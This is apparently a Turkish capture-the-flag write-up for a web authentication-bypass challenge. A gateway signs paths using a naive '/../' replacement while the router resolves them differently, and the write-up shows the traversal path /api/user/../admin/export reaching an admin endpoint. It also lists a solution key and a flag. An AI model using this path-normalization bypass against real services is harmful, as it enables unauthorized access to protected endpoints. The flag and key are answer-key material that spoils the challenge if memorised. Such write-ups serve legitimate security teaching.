# 75. Kanonik İmza (Path Normalization Mismatch)

**Kategori:** Web / Auth Bypass
**Konu:** İmzalama için kullanılan path normalization fonksiyonu, router'ın path resolution'ından farklı; aynı string iki tarafta farklı yorumlanıyor.

## Çözüm

`gateway.js` içinde imzalanan canonical path şöyle normalize ediliyordu:

```js
req.path.replace('/../', '/')
```

Ancak router tarafında resolution farklı yapılıyordu:

```
/api/user/../admin/export → /api/admin/export
```

### Saldırı

İmza `/api/user/../admin/export` üzerinden hesaplanırken (yetkili user endpoint gibi görünür), router request'i `/api/admin/export`'a yönlendiriyor.

Başarılı HAR kaydı:

```
path:   /api/user/../admin/export
status: 200
trace:  CANON-991
```

Logda kabul edilen kayıt:

```
accepted trace=CANON-991 marker=canon_sig_P6T9
```

Solution key:

```
canon_sig_P6T9
```

## Flag

```
ISUCTF{LHU5MM-53YEVT-6SY6RH}
```
